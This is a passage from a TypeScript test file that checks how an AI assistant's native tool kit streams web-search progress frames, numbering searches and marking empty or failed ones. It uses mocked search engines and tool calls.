		const seen: Array<{ frame: unknown; returned: boolean }> = [];
		for await (const o of stream) if (o.searchProgress) seen.push({ frame: o.searchProgress, returned });
		expect(JSON.stringify(seen)).not.toContain("eu ai act");
		expect(seen).toEqual([
			{ frame: { n: 1 }, returned: false },
			{ frame: { n: 1, sources: 1 }, returned: true },
		]);
	});

	it("numbers searches across rounds and counts an empty one as 0 and an unfinished one as failed", async () => {
		const e = engines();
		e.web
			.mockImplementationOnce(async (query: string) => ({
				query,
				merged: [hit("https://w/1", query), hit("https://w/2", query)],
				asOf: "2026-10-29",
				relevanceVerified: true,
			}))
			.mockResolvedValueOnce({ query: "b", merged: [], asOf: "", relevanceVerified: true })
			.mockImplementationOnce(async (_q: string, o?: WebOpts) => {
				o?.onFailed?.("timeout");
				return undefined as never;
			});
		stub([
			call("web_search", { query: "a" }, "c1"),
			call("web_search", { query: "b" }, "c2"),
			call("web_search", { query: "c" }, "c3"),
			answer("done"),
		]);
		const outputs = await run(nativeToolKit({ locals: undefined, web: true, engines: e as never }));
		expect(progress(outputs)).toEqual([
			{ n: 1 },
			{ n: 1, sources: 2 },
			{ n: 2 },
			{ n: 2, sources: 0 },
			{ n: 3 },
			{ n: 3, sources: 0, failed: true },
		]);
	});

	it("streams nothing for a turn that searched nothing", async () => {
		stub([call("search_catalog", { query: "project X" }, "c1"), answer("ok")]);
		const outputs = await run(nativeToolKit({ locals: undefined, web: true, engines: engines() as never }));
		expect(progress(outputs)).toEqual([]);
	});
});
